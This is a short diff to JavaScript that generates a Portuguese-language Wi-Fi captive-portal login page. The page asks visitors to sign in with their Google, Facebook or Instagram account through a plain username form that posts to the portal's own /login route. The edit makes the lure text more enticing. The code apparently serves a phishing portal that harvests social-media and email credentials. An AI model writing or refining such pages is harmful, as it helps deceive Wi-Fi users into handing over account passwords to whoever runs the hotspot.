@@ -112,9 +112,8 @@ function pagina(titulo, corpo) {
 const esc = (s) => String(s).replace(/[&<>"']/g, (c) => `&#${c.charCodeAt(0)};`);
 
 function formLogin(destino, erro) {
-  return pagina(MARCA, `<h1>Conecte-se à internet</h1>
-<p>Entre com seus dados para liberar o acesso Wi-Fi.</p>
-<p>Você pode usar sua conta Google (Gmail), Facebook ou Instagram.</p>
+  return pagina(MARCA, `<h1>Conecte-se agora</h1>
+<p>Acesse utilizando sua conta Google (Gmail), Facebook ou Instagram e tenha acesso a internet mais rápida do Brasil.</p>
 ${erro ? `<div class="erro">${erro}</div>` : ''}
 <form method="post" action="/login">
  <input name="usuario" placeholder="Usuário" autocomplete="username" autofocus required>
